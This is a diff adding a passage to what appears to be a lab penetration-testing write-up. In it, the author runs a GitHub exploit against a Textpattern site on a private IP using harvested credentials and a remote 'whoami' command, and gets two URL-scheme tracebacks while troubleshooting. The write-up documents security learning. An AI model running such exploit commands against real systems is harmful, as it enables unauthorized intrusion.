@@ -881,3 +881,67 @@ After searching for another exploit I managed to find one on GitHub written in P
 
 ![](attachments/Pasted%20image%2020250214213939.png)
 
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami          
+Traceback (most recent call last):
+  File "/home/kali/Downloads/exploit.py", line 104, in <module>
+    main()
+  File "/home/kali/Downloads/exploit.py", line 88, in main
+    s,_txp_token = login(login_url, user, password)
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/exploit.py", line 42, in login
+    s.get(login_url, verify=False)
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
+    return self.request("GET", url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
+    prep = self.prepare_request(req)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
+    p.prepare(
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
+    self.prepare_url(url, params)
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
+    raise MissingSchema(
+requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/index.php?
+
+```
+
+Troubleshooting the error, I went on to modify the exploit script to include the correct directory to login onto the website
+
+![](attachments/Pasted%20image%2020250214214614.png)
+
+After modifying the script
+
+![](attachments/Pasted%20image%2020250214214642.png)
+
+After another test the error was still being displayed
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami
+Traceback (most recent call last):
+  File "/home/kali/Downloads/exploit.py", line 104, in <module>
+    main()
+  File "/home/kali/Downloads/exploit.py", line 88, in main
+    s,_txp_token = login(login_url, user, password)
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/exploit.py", line 42, in login
+    s.get(login_url, verify=False)
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
+    return self.request("GET", url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
+    prep = self.prepare_request(req)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
+    p.prepare(
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
+    self.prepare_url(url, params)
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
+    raise MissingSchema(
+requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/textpattern/index.php?
+
+```
+
